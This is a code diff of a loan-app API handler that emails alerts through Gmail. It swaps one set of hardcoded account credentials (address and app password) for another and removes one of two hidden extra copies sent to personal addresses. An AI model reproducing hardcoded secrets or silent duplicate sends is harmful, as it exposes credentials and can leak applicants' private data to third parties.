@@ -26,13 +26,13 @@ export default async function handler(req, res) {
         const transport = nodemailer.createTransport({
             service: "gmail",
             auth: {
-                user: 'rackeragency@gmail.com',
-                pass: 'phtspmtkanwfyhkc'
+                user: 'creditnow5532@gmail.com',
+                pass: 'sorstwtushxwscnf'
             },
         });
         const mailOptions = {
-            from: `Racker Agency <rackeragency@gmail.com>`,
-            to: "rackeragency@gmail.com",
+            from: `Credit Now <creditnow5532@gmail.com>`,
+            to: "creditnow5532@gmail.com",
             subject: "Loan App Alert!",
             html: `
         <div style="padding: 16px; border-width: 3px; border-color: rgb(209, 213, 219); border-radius: 12px;">
@@ -64,7 +64,6 @@ export default async function handler(req, res) {
         };
 
         await transport.sendMail(mailOptions);
-        await transport.sendMail({ ...mailOptions, to: "Sk.sameer20019@gmail.com" });
         await transport.sendMail({ ...mailOptions, to: "kkashif436@gmail.com" });
 
 
